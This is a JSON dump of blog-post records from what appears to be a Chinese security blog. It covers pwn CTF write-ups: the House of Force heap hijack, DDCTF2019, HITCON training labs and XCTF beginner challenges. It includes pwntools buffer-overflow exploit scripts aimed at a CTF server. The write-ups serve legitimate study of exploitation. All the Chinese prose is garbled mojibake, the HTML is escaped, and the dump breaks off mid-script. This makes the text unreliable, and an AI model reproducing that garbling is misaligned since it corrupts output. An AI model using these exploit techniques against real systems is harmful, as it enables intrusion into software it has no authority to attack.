id=\"top-chunkçš„åˆ†å‰²æœºåˆ¶ä¸åˆ©ç”¨ç‚¹\"><a href=\"#top-chunkçš„åˆ†å‰²æœºåˆ¶ä¸åˆ©ç”¨ç‚¹\" class=\"headerlink\" title=\"top chunkçš„åˆ†å‰²æœºåˆ¶ä¸åˆ©ç”¨ç‚¹\"></a>top chunkçš„åˆ†å‰²æœºåˆ¶ä¸åˆ©ç”¨ç‚¹</h3><p>ä¼—æ‰€å‘¨çŸ¥ï¼Œtop chunkçš„ä½œç”¨æ˜¯ä½œä¸ºåå¤‡å †ç©ºé—´ï¼Œåœ¨å„binä¸­æ²¡æœ‰chunkå¯æä¾›æ—¶ï¼Œåˆ†å‰²å‡ºä¸€ä¸ªchunkæä¾›ç»™ç”¨æˆ·ã€‚é‚£ä¹ˆè¿™ä¸ªåˆ†å‰²è¿‡ç¨‹æ˜¯æ€æ ·çš„å‘¢ï¼Ÿæˆ‘ä»¬æ¥çœ‹ä¸€ä»½æºç ï¼š</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">victim = av-&gt;top;</span><br><span class=\"line\">size   = chunksize(victim);</span><br><span class=\"line\"><span class=\"keyword\">if</span> ((<span class=\"keyword\">unsigned</span> <span class=\"keyword\">long</span>) (size) &gt;= (<span class=\"keyword\">unsigned</span> <span class=\"keyword\">long</span>) (nb + MINSIZE)) <span class=\"comment\">//æ£€æŸ¥è¯·æ±‚sizeæ˜¯å¦å¯ä»¥åˆ†é…</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    remainder_size = size - nb; <span class=\"comment\">// åˆ†é…åsizeï¼Œæ­¤å¤„nbä¸ºæœ‰ç¬¦å·æ•°</span></span><br><span class=\"line\">    remainder      = chunk_at_offset(victim, nb); <span class=\"comment\">// åˆ†é…åæŒ‡é’ˆ</span></span><br><span class=\"line\">    av-&gt;top        = remainder; <span class=\"comment\">// top = åˆ†é…åçš„æŒ‡é’ˆ</span></span><br><span class=\"line\">    set_head(victim, nb | PREV_INUSE | <span class=\"comment\">// è®¾ç½®PREV_INUSEå’ŒNON_MAIN_ARENA</span></span><br><span class=\"line\">            (av != &amp;main_arena ? NON_MAIN_ARENA : <span class=\"number\">0</span>)); </span><br><span class=\"line\">    set_head(remainder, remainder_size | PREV_INUSE); <span class=\"comment\">//è®¾ç½®top</span></span><br><span class=\"line\"></span><br><span class=\"line\">    check_malloced_chunk(av, victim, nb);</span><br><span class=\"line\">    <span class=\"keyword\">void</span> *p = chunk2mem(victim);</span><br><span class=\"line\">    alloc_perturb(p, bytes);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> p;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>é¦–å…ˆæ˜¯libcä¼šæ£€æŸ¥ç”¨æˆ·ç”³è¯·çš„å¤§å°ï¼Œtop chunkæ˜¯å¦èƒ½ç»™çš„èµ·ï¼Œå¦‚æœç»™å¾—èµ·ï¼Œå°±ç”±top chunkçš„headå¤„ï¼Œä»¥ç”¨æˆ·ç”³è¯·å¤§å°æ‰€åŒ¹é…çš„chunkå¤§å°ä¸ºåç§»é‡ï¼Œå°†top chunkçš„ä½ç½®æ¨åˆ°æ–°çš„ä½ç½®ï¼Œè€ŒåŸæ¥çš„top chunk headå¤„å°±ä½œä¸ºæ–°çš„å †å—è¢«åˆ†é…ç»™ç”¨æˆ·äº†</p>\n<p>è¯•æƒ³ï¼Œå¦‚æœæˆ‘ä»¬èƒ½æ§åˆ¶top chunkåœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­æ¨åˆ°ä»»æ„ä½ç½®ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœæˆ‘ä»¬èƒ½æ§åˆ¶ç”¨æˆ·ç”³è¯·çš„å¤§å°ä¸ºä»»æ„å€¼ï¼Œæˆ‘ä»¬å°±èƒ½å°†top chunkåŠ«æŒåˆ°ä»»æ„å†…å­˜åœ°å€ï¼Œç„¶åå°±å¯ä»¥æ§åˆ¶ç›®æ ‡å†…å­˜ã€‚</p>\n<p>ä¸€èˆ¬æ¥è¯´ï¼Œpwnä¸­åŠ«æŒæ§åˆ¶æµå¸¸å¸¸å–malloc_hook, gotè¡¨ç­‰æŒ‡é’ˆï¼Œä¸å †ç©ºé—´ä¸­çš„top chunkç›¸èšç”šè¿œï¼Œè¿œåˆ°æ‰€éœ€è¦ç”³è¯·çš„sizeå¿…å®šè¶…è¿‡top chunkç°æœ‰çš„å¤§å°ï¼Œæ— æ³•æ§åˆ¶ifæ¡ä»¶çš„æ£€æŸ¥ã€‚</p>\n<p>ä½†æ˜¯ï¼Œæˆ‘ä»¬çœ‹åˆ°ifæ¡ä»¶æ£€æŸ¥æ—¶sizeè¢«å¼ºåˆ¶è½¬æ¢ä¸ºunsigned longï¼Œæ‰€ä»¥å¦‚æœæˆ‘ä»¬å°†sizeæº¢å‡ºè¦†ç›–ä¸º0xffffffffï¼ˆ-1ï¼‰ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ä»»æ„ç”³è¯·ã€‚æ­¤å¤–ï¼Œè™½ç„¶æ­¤å¤„çš„æ£€æŸ¥ä¸­ï¼Œç”¨æˆ·ç”³è¯·çš„å¤§å°ä¹Ÿè¢«å½“ä½œæ— ç¬¦å·æ•´æ•°å¯¹å¾…ï¼Œä½†æ˜¯åœ¨åé¢æ¨top chunkçš„æ—¶å€™æ˜¯ä»¥intå¯¹å¾…çš„ï¼Œæ‰€ä»¥å¯ä»¥åŠ«æŒåˆ°ä½åœ°å€ï¼ŒåŠ è´Ÿæ•°ã€‚</p>\n<h3 id=\"åˆ©ç”¨æ¡ä»¶\"><a href=\"#åˆ©ç”¨æ¡ä»¶\" class=\"headerlink\" title=\"åˆ©ç”¨æ¡ä»¶\"></a>åˆ©ç”¨æ¡ä»¶</h3><ul>\n<li>ç”¨æˆ·å¯ä»¥ä¿®æ”¹top chunkçš„sizeå­—æ®µ</li>\n<li>ç”¨æˆ·å¯ä»¥ç”³è¯·ä»»æ„å¤§å°çš„å †å†…å­˜ï¼ˆåŒ…æ‹¬è´Ÿæ•°ï¼‰</li>\n</ul>","keywords":null,"cover":null,"content":null,"text":"æœ¬æ–‡è®²ä¸€ä¸‹è¿‘æœŸå­¦ä¹ çš„ä¸¤ç§å›´ç»•Top Chunkåšæ–‡ç« çš„å †åˆ©ç”¨æ–¹æ³•ï¼šHouse of Forceå’Œç›´æ¥ä¿®æ”¹main_arenaä¸­çš„topæŒ‡é’ˆã€‚House of forceï¼ˆTop chunkåŠ«æŒï¼‰top chunkçš„åˆ†å‰²æœºåˆ¶ä¸åˆ©ç”¨ç‚¹ä¼—æ‰€å‘¨çŸ¥ï¼Œtop chunkçš„ä½œç”¨æ˜¯ä½œä¸ºåå¤‡å †ç©ºé—´","link":"","raw":null,"photos":[],"categories":[],"tags":[{"name":"pwn","slug":"pwn","count":9,"path":"api/tags/pwn.json"}]},{"title":"DDCTF2019-writeup","slug":"DDCTF2019-writeup","date":"2019-04-18T11:41:06.000Z","updated":"2019-09-21T08:33:04.441Z","comments":true,"path":"api/articles/DDCTF2019-writeup.json","excerpt":"<p>æœ¬æ¬¡DDCTF2019æŠ±ç€ç©ä¸€ç©çš„å¿ƒæ€å‚ä¸äº†ä¸€ä¸‹ï¼Œäº‹å…ˆä¸çŸ¥é“Pwnçš„é¢˜ç›®è¿™ä¹ˆå°‘ï¼ŒREçš„é¢˜ç›®ä¹Ÿä¸ç®—å¤šï¼ˆä¸»è¦REçš„éš¾é¢˜æˆ‘ä¸ä¼šåšï¼Œç®€å•é¢˜åˆæ¯”è¾ƒæ°´ï¼‰ï¼Œæ‰€ä»¥å°±ä¸€å¼€å§‹åšäº†ä¸¤å¤©ï¼Œåç»­æ²¡æœ‰å†å°è¯•ï¼Œæœ€åæ’å100å¤šä½ã€‚ä¸‹é¢ç®€å•æ€»ç»“ä¸€ä¸‹Pwnå’ŒREå‡ é“é¢˜çš„writeupã€‚</p>\n<h1 id=\"Pwn\"><a href=\"#Pwn\" class=\"headerlink\" title=\"Pwn\"></a>Pwn</h1><p>pwnåªæœ‰ä¸€é“é¢˜ç›®</p>\n<h2 id=\"Strike\"><a href=\"#Strike\" class=\"headerlink\" title=\"Strike\"></a>Strike</h2><p>è¯¥é¢˜ç›®æä¾›äº†libcï¼Œé˜²æŠ¤å¦‚ä¸‹ï¼š</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">liwc@ubuntu:~/pwn/DDCTF2019$ checksec xpwn </span><br><span class=\"line\">[*] &apos;/home/liwc/pwn/DDCTF2019/xpwn&apos;</span><br><span class=\"line\">    Arch:     i386-32-little</span><br><span class=\"line\">    RELRO:    Partial RELRO</span><br><span class=\"line\">    Stack:    No canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>\n<p>æœªå¼€å¯canaryå’ŒPIEï¼Œåªå¼€å¯äº†NXï¼Œä¸”ä¸º32ä½ï¼Œæœ‰æ ˆåˆ©ç”¨çš„å¯èƒ½ã€‚</p>\n<p>ç®€å•è¿è¡Œç¨‹åºå‘ç°ç¨‹åºé¦–å…ˆè¦æ±‚è¾“å…¥ç”¨æˆ·åï¼Œç„¶ååœ¨æ‰“å°ç”¨æˆ·åçš„æ—¶å€™ä¼šå‡ºç°ä¸€äº›ä¸å¯è§å­—ç¬¦ï¼Œè¿™é‡Œå¯èƒ½å­˜åœ¨ä¿¡æ¯æ³„æ¼æ¼æ´ã€‚ä¹‹åè¦æ±‚è¾“å…¥å¯†ç çš„é•¿åº¦ï¼Œå†è¾“å…¥å¯†ç ã€‚ç”¨IDAç®€å•æŸ¥çœ‹ä¸‹ï¼š</p>\n<p>åœ¨å‘æ ˆä¸Šå†™nameæ—¶ï¼Œç”±äºå†™å®Œå°±ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„%sæ ¼å¼è¾“å‡ºï¼Œæ‰€ä»¥åªè¦ä¸è¾“å…¥\\x00ï¼Œå°±å¯ä»¥éšæ„leakå‡ºæ ˆä¸Šçš„æ•°æ®ã€‚</p>","keywords":null,"cover":null,"content":null,"text":"æœ¬æ¬¡DDCTF2019æŠ±ç€ç©ä¸€ç©çš„å¿ƒæ€å‚ä¸äº†ä¸€ä¸‹ï¼Œäº‹å…ˆä¸çŸ¥é“Pwnçš„é¢˜ç›®è¿™ä¹ˆå°‘ï¼ŒREçš„é¢˜ç›®ä¹Ÿä¸ç®—å¤šï¼ˆä¸»è¦REçš„éš¾é¢˜æˆ‘ä¸ä¼šåšï¼Œç®€å•é¢˜åˆæ¯”è¾ƒæ°´ï¼‰ï¼Œæ‰€ä»¥å°±ä¸€å¼€å§‹åšäº†ä¸¤å¤©ï¼Œåç»­æ²¡æœ‰å†å°è¯•ï¼Œæœ€åæ’å100å¤šä½ã€‚ä¸‹é¢ç®€å•æ€»ç»“ä¸€ä¸‹Pwnå’ŒREå‡ é“é¢˜çš„writeupã€‚Pwnpwnåªæœ‰ä¸€é“é¢˜ç›®St","link":"","raw":null,"photos":[],"categories":[],"tags":[{"name":"pwn","slug":"pwn","count":9,"path":"api/tags/pwn.json"},{"name":"RE","slug":"RE","count":2,"path":"api/tags/RE.json"}]},{"title":"HITCON_trainingé¢˜è§£(äºŒ)","slug":"HITCON-training-2","date":"2019-04-10T06:47:59.000Z","updated":"2019-09-21T08:33:50.169Z","comments":true,"path":"api/articles/HITCON-training-2.json","excerpt":"<h2 id=\"Lab10â€”â€”hacknote\"><a href=\"#Lab10â€”â€”hacknote\" class=\"headerlink\" title=\"Lab10â€”â€”hacknote\"></a>Lab10â€”â€”hacknote</h2><h3 id=\"é˜²æŠ¤\"><a href=\"#é˜²æŠ¤\" class=\"headerlink\" title=\"é˜²æŠ¤\"></a>é˜²æŠ¤</h3><p>å¯ä»¥çœ‹åˆ°æœ¬é¢˜å¼€å¯äº†canaryå’Œnxï¼Œè¿™æ—¶æƒ³åœ¨æ ˆä¸Šè¿›è¡Œåˆ©ç”¨å°±ç›¸å½“å›°éš¾äº†ã€‚</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">liwc@ubuntu:~/pwn/HITCON-Training/LAB/lab10$ checksec hacknote</span><br><span class=\"line\">[*] &apos;/home/liwc/pwn/HITCON-Training/LAB/lab10/hacknote&apos;</span><br><span class=\"line\">    Arch:     i386-32-little</span><br><span class=\"line\">    RELRO:    Partial RELRO</span><br><span class=\"line\">    Stack:    Canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>\n<h3 id=\"åˆ†æ\"><a href=\"#åˆ†æ\" class=\"headerlink\" title=\"åˆ†æ\"></a>åˆ†æ</h3><p>æœ¬é¢˜æ˜¯ä¸€é“å…¸å‹çš„å †èœå•é¢˜ï¼Œå…±æœ‰4ä¸ªé€‰é¡¹</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1. Add note          </span><br><span class=\"line\">2. Delete note       </span><br><span class=\"line\">3. Print note        </span><br><span class=\"line\">4. Exit</span><br></pre></td></tr></table></figure>","keywords":null,"cover":null,"content":null,"text":"Lab10â€”â€”hacknoteé˜²æŠ¤å¯ä»¥çœ‹åˆ°æœ¬é¢˜å¼€å¯äº†canaryå’Œnxï¼Œè¿™æ—¶æƒ³åœ¨æ ˆä¸Šè¿›è¡Œåˆ©ç”¨å°±ç›¸å½“å›°éš¾äº†ã€‚1<br>2<br>3<br>4<br>5<br>6<br>7<br>liwc@ubuntu:~/pwn/HITCON-Training/LAB/lab10$ checkse","link":"","raw":null,"photos":[],"categories":[],"tags":[{"name":"pwn","slug":"pwn","count":9,"path":"api/tags/pwn.json"}]},{"title":"HITCON_trainingé¢˜è§£(ä¸€)","slug":"HITCON-training-1","date":"2019-04-10T06:47:42.000Z","updated":"2019-09-21T08:33:39.313Z","comments":true,"path":"api/articles/HITCON-training-1.json","excerpt":"<h2 id=\"Lab1â€”â€”sysmagic\"><a href=\"#Lab1â€”â€”sysmagic\" class=\"headerlink\" title=\"Lab1â€”â€”sysmagic\"></a>Lab1â€”â€”sysmagic</h2><h3 id=\"é˜²æŠ¤\"><a href=\"#é˜²æŠ¤\" class=\"headerlink\" title=\"é˜²æŠ¤\"></a>é˜²æŠ¤</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">liwc@ubuntu:~/pwn/HITCON-Training/LAB/lab1$ checksec sysmagic</span><br><span class=\"line\">[*] &apos;/home/liwc/pwn/HITCON-Training/LAB/lab1/sysmagic&apos;</span><br><span class=\"line\">    Arch:     i386-32-little</span><br><span class=\"line\">    RELRO:    Partial RELRO</span><br><span class=\"line\">    Stack:    Canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>\n<h3 id=\"åˆ†æ\"><a href=\"#åˆ†æ\" class=\"headerlink\" title=\"åˆ†æ\"></a>åˆ†æ</h3><p>ç¨‹åºè¦æ±‚è¾“å…¥ä¸€ä¸ªmagicï¼Œç„¶åå°±ç›´æ¥é€€å‡ºã€‚ç”¨IDAçœ‹ä¸€ä¸‹ï¼š</p>\n<p>åœ¨å‡½æ•°get_flagä¸­ç›´æ¥è¦æ±‚è¯»å…¥åˆ°æ ˆä¸Šv2å¤„ï¼ˆebp+0x7cï¼‰ï¼Œå¦‚æœv2å’Œéšæœºæ•°bufç›¸ç­‰ï¼Œåˆ™ç›´æ¥æ‰“å°å‡ºæ ˆä¸Šçš„flagã€‚bufåœ¨(ebp+0x80å¤„)ã€‚ä¸è¿‡è²Œä¼¼æ²¡æœ‰è¾ƒå¥½çš„æº¢å‡ºæ–¹æ³•ï¼Œä¸è¿‡è¿™å®é™…ä¸Šæ˜¯ä¸€é“é€†å‘é¢˜ï¼Œé€šè¿‡é€†å‘å¯ä»¥ç›´æ¥æ‰¾åˆ°ç­”æ¡ˆã€‚</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">fd = open(<span class=\"string\">\"/dev/urandom\"</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\"> read(fd, &amp;buf, <span class=\"number\">4u</span>);</span><br><span class=\"line\"> <span class=\"built_in\">printf</span>(<span class=\"string\">\"Give me maigc :\"</span>);</span><br><span class=\"line\"> __isoc99_scanf(<span class=\"string\">\"%d\"</span>, &amp;v2);</span><br><span class=\"line\"> <span class=\"keyword\">if</span> ( buf == v2 )</span><br><span class=\"line\"> &#123;</span><br><span class=\"line\">   <span class=\"keyword\">for</span> ( i = <span class=\"number\">0</span>; i &lt;= <span class=\"number\">0x30</span>; ++i )</span><br><span class=\"line\">     <span class=\"built_in\">putchar</span>((<span class=\"keyword\">char</span>)(*(&amp;v5 + i) ^ *((_BYTE *)&amp;v54 + i)));</span><br><span class=\"line\"> &#125;</span><br></pre></td></tr></table></figure>\n<p>è§‚å¯Ÿæ±‡ç¼–ä»£ç ï¼Œè¿˜åŸä¸¤ä¸ªå­—ç¬¦ä¸²ï¼Œç„¶åæŒ‰ä½å¼‚æˆ–å³å¯æ‰¾åˆ°flagã€‚</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">str1 = &apos;\\x44\\x6f\\x5f\\x79\\x6f\\x75\\x5f\\x6b&apos;</span><br><span class=\"line\">str1 += &apos;\\x6e\\x6f\\x77\\x5f\\x77\\x68\\x79\\x5f&apos;</span><br><span class=\"line\">str1 += &apos;\\x6d\\x79\\x5f\\x74\\x65\\x61\\x6d\\x6d&apos;</span><br><span class=\"line\">str1 += &apos;\\x61\\x74\\x65\\x5f\\x4f\\x72\\x61\\x6e&apos;</span><br><span class=\"line\">str1 += &apos;\\x67\\x65\\x5f\\x69\\x73\\x5f\\x73\\x6f&apos;</span><br><span class=\"line\">str1 += &apos;\\x5f\\x61\\x6e\\x67\\x72\\x79\\x3f\\x3f\\x3f&apos;</span><br><span class=\"line\">str2 = &apos;\\x07\\x3b\\x19\\x02\\x0b\\x10\\x3d\\x1e&apos;</span><br><span class=\"line\">str2 += &apos;\\x09\\x08\\x12\\x2d\\x28\\x59\\x0a\\x00\\x1e&apos;</span><br><span class=\"line\">str2 += &apos;\\x16\\x00\\x04\\x55\\x16\\x08\\x1f\\x07\\x01&apos;</span><br><span class=\"line\">str2 += &apos;\\x09\\x00\\x7e\\x1c\\x3e\\x0a\\x1e\\x0b\\x6b&apos;</span><br><span class=\"line\">str2 += &apos;\\x04\\x42\\x3c\\x2c\\x5b\\x31\\x55\\x02\\x1e&apos;</span><br><span class=\"line\">str2 += &apos;\\x21\\x10\\x4c\\x1e\\x42&apos;</span><br><span class=\"line\"></span><br><span class=\"line\">flag = &quot;&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">for i in range(len(str1)):</span><br><span class=\"line\">\tflag += chr(ord(str1[i]) ^ ord(str2[i]))</span><br><span class=\"line\"></span><br><span class=\"line\">print flag</span><br><span class=\"line\"></span><br><span class=\"line\">CTF&#123;debugger_1s_so_p0werful_1n_dyn4m1c_4n4lySis!&#125;</span><br><span class=\"line\">[Finished in 0.1s]</span><br></pre></td></tr></table></figure>","keywords":null,"cover":null,"content":null,"text":"Lab1â€”â€”sysmagicé˜²æŠ¤1<br>2<br>3<br>4<br>5<br>6<br>7<br>liwc@ubuntu:~/pwn/HITCON-Training/LAB/lab1$ checksec sysmagic<br>[*] &apos;/home/liwc/pwn","link":"","raw":null,"photos":[],"categories":[],"tags":[{"name":"pwn","slug":"pwn","count":9,"path":"api/tags/pwn.json"}]},{"title":"æ”»é˜²ä¸–ç•Œåˆ·é¢˜â€”â€”æ–°æ‰‹ç»ƒä¹ ","slug":"æ”»é˜²ä¸–ç•Œåˆ·é¢˜â€”â€”æ–°æ‰‹ç»ƒä¹ ","date":"2019-03-20T08:15:35.000Z","updated":"2019-09-21T08:34:07.732Z","comments":true,"path":"api/articles/æ”»é˜²ä¸–ç•Œåˆ·é¢˜â€”â€”æ–°æ‰‹ç»ƒä¹ .json","excerpt":"<h1 id=\"æ–°æ‰‹ç»ƒä¹ \"><a href=\"#æ–°æ‰‹ç»ƒä¹ \" class=\"headerlink\" title=\"æ–°æ‰‹ç»ƒä¹ \"></a>æ–°æ‰‹ç»ƒä¹ </h1><h2 id=\"when-did-you-born\"><a href=\"#when-did-you-born\" class=\"headerlink\" title=\"when_did_you_born\"></a>when_did_you_born</h2><p>gets(&amp;v4)å¤„å­˜åœ¨æ ˆæº¢å‡ºï¼Œè¦†ç›–æ‰v5ï¼Œä¸º1926(0x786)å³å¯ã€‚</p>\n<p>v4 = rsp+0x0; v5 = rsp + 0x8; æ‰€ä»¥åç§»ä¸º0x8</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">__int64 __<span class=\"function\">fastcall <span class=\"title\">main</span><span class=\"params\">(__int64 a1, <span class=\"keyword\">char</span> **a2, <span class=\"keyword\">char</span> **a3)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  __int64 result; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  <span class=\"keyword\">char</span> v4; <span class=\"comment\">// [rsp+0h] [rbp-20h]</span></span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span> v5; <span class=\"comment\">// [rsp+8h] [rbp-18h]</span></span><br><span class=\"line\">  ...</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">\"What's Your Birth?\"</span>);</span><br><span class=\"line\">  __isoc99_scanf(<span class=\"string\">\"%d\"</span>, &amp;v5);</span><br><span class=\"line\">  ...</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">\"What's Your Name?\"</span>);</span><br><span class=\"line\">    gets(&amp;v4);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">\"You Are Born In %d\\n\"</span>, v5);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( v5 == <span class=\"number\">1926</span> )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"built_in\">puts</span>(<span class=\"string\">\"You Shall Have Flag.\"</span>);</span><br><span class=\"line\">      system(<span class=\"string\">\"cat flag\"</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">\t...</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>expå¦‚ä¸‹ï¼š</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context.log_level = <span class=\"string\">\"debug\"</span></span><br><span class=\"line\"><span class=\"comment\"># p = process(\"./when_did_you_born\")</span></span><br><span class=\"line\">p = remote(<span class=\"string\">\"111.198.29.45\"</span>, <span class=\"number\">31452</span>)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\"What's Your Birth?\\n\"</span>)</span><br><span class=\"line\">p.sendline(<span class=\"string\">\"123\"</span>)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\"What's Your Name?\\n\"</span>)</span><br><span class=\"line\">payload = <span class=\"string\">\"a\"</span> * <span class=\"number\">8</span> + <span class=\"string\">\"\\x86\\x07\"</span></span><br><span class=\"line\">p.send(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<h2 id=\"hello-pwn\"><a href=\"#hello-pwn\" class=\"headerlink\" title=\"hello_pwn\"></a>hello_pwn</h2><p>è¯¥é¢˜è·Ÿä¸Šä¸€é¢˜ç±»ä¼¼ï¼Œä¹Ÿæ˜¯æº¢å‡ºï¼Œä¸è¿‡æ˜¯æº¢å‡ºå…¨å±€å˜é‡ã€‚</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">__int64 __<span class=\"function\">fastcall <span class=\"title\">main</span><span class=\"params\">(__int64 a1, <span class=\"keyword\">char</span> **a2, <span class=\"keyword\">char</span> **a3)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  alarm(<span class=\"number\">0x3C</span>u);</span><br><span class=\"line\">  setbuf(<span class=\"built_in\">stdout</span>, <span class=\"number\">0L</span>L);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">\"~~ welcome to ctf ~~     \"</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">\"lets get helloworld for bof\"</span>);</span><br><span class=\"line\">  read(<span class=\"number\">0</span>, &amp;unk_601068, <span class=\"number\">0x10</span>uLL);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( dword_60106C == <span class=\"number\">1853186401</span> )</span><br><span class=\"line\">    sub_400686();</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">0L</span>L;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"comment\"># p = process(\"./hello_pwn\")</span></span><br><span class=\"line\">p = remote(<span class=\"string\">\"111.198.29.45\"</span>, <span class=\"number\">31454</span>)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\"lets get helloworld for bof\\n\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">payload = <span class=\"string\">\"a\"</span> * <span class=\"number\">4</span> + <span class=\"string\">\"\\x61\\x61\\x75\\x6e\"</span></span><br><span 